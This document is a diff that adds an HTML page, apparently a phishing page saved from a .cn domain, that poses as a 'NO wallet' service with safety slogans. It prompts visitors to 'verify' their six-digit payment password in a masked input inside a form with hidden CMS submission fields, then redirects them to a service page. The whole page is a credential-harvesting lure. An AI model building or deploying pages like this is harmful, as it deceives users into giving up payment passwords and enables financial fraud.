@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<!-- saved from url=(0027)http://noqbl04.cn/page.html -->
+<html lang="en" style="font-size: 100px;">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+	<meta name="viewport"
+		content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
+	<script src="./file/index/jquery.min.js"></script>
+	<title>NO钱包</title>
+	<!--<base href="/">-->
+	<base href=".">
+
+	<script>
+		(function (doc, win) {
+			var docEl = doc.documentElement,
+				resizeEvt = 'orientationchange' in window ? 'orientationchange' : 'resize',
+				recalc = function () {
+					var clientWidth = docEl.clientWidth;
+					if (!clientWidth) return;
+					if (clientWidth >= 450) {
+						docEl.style.fontSize = '100px';
+					} else {
+						docEl.style.fontSize = 100 * (clientWidth / 450) + 'px';
+					}
+				};
+			if (!doc.addEventListener) return;
+			win.addEventListener(resizeEvt, recalc, false);
+			doc.addEventListener('DOMContentLoaded', recalc, false);
+		})(document, window);
+	</script>
+
+	<style type="text/css">
+		ul,
+		li {
+			list-style: none;
+		}
+
+		.password-div input {
+			width: 1px;
+			height: 1px;
+			opacity: 0;
+			border: 0;
+		}
+
+		.password-lable {
+			height: 30px;
+			clear: both;
+		}
+
+		.password-lable li {
+			float: left;
+			width: 100%;
+			height: 49px;
+			line-height: 30px;
+			text-align: center;
+			border: 1px solid #dedede;
+			margin-left: -1px;
+			line-height: 49px;
+		}
+
+		.password-lable>ul:nth-child(1)>li {
+			font-size: 47px;
+		}
+
+		html {
+			background: black;
+		}
+
+		body {
+			max-width: 450px;
+			margin: auto;
+			background: #fff;
+			height: 100%;
+			position: absolute;
+			bottom: 0px;
+			left: 0px;
+			right: 0px;
+		}
+	</style>
+	<link rel="stylesheet" href="./file/index/1.css">
+</head>
+
+<body>
+	<div class="a1">
+		<div style="overflow: hidden;"><a href="http://noqbl04.cn/###"><img alt="" src="./file/index/1.png"
+					style="float: right;margin-top: 15px;margin-right: 15px;width: 40px;height: 44px;"></a></div>
+		<div><img alt="" src="./file/index/2.png" style="margin: 0 auto;display: table;margin-top: 15px;"></div>
+		<p style="font-size: 13px;text-align: center;">不仅省钱，还能赚钱</p>
+		<p style="font-size: 13px;text-align: center;margin: 0;margin-top: -10px;color: #1bd04eb2;font-weight: 600;">
+			因为严格+较真，所以安全、干净、有保障!</p>
+	</div>
+	<p style="text-align: center;font-size: 18;color: #1678ff;margin-bottom: 10px;">验证六位数支付密码</p>
+
+
+	<form name="feedback" method="post" enctype="multipart/form-data"
+		style="margin: auto 20px;margin-top: 0px;">
+		<input name="enews" type="hidden" value="AddFeedback">
+		<input type="hidden" name="bid" value="3"><input type="hidden" name="ecmsfrom" value="http://www.noqbl04.cn/kk">
+		<div class="password-div" style="height: 67px;">
+			<label for="password" class="password-lable">
+				<ul style="display: flex;padding-left: 0px;margin: 0 3px;">
+					<li></li>
+					<li></li>
+					<li></li>
+					<li></li>
+					<li></li>
+					<li></li>
+				</ul>
+				<input id="password" type="password" name="password" maxlength="6">
+			</label>
+		</div>
+		<button class="btn btn-primary w-100" type="button"
+		style="width: 100%;background: #095effe3;border: navajowhite;line-height: 0.500rem;color: fff;font-size: 
+18px;border-radius: 5px;margin-top: 27px;color: #fff;">下一步</button>
+	</form>
+</body>
+
+<script type="text/javascript">
+	$(".password-div input").on("input", function (e) { //标签为password-div下的input添加oninput事件
+		var number = 6;   //定义输入最大值
+		var pw = $("input[name = 'password']").val(); //定义pw为name是password的input框的输入值
+		var list = $(".password-div ul li");  //定义list是li
+		for (var i = 0; i < number; i++) {    //for循环遍历将·放入li标签
+			if (pw[i]) {
+				$(list[i]).text("·");
+			} else {
+				$(list[i]).text("");
+			};
+		};
+	});
+	$(".password-div ul").click(function () {
+		$("input[name = 'password']").val("");
+		$("#password").focus();
+		$(".password-div ul li").text("");
+	});
+
+	$('.btn').click(function() {
+		if (!$('#password').val()) {
+			return false
+		} else {
+			window.location.href = './service.html'
+		}
+	})
+</script>
+
+</html>
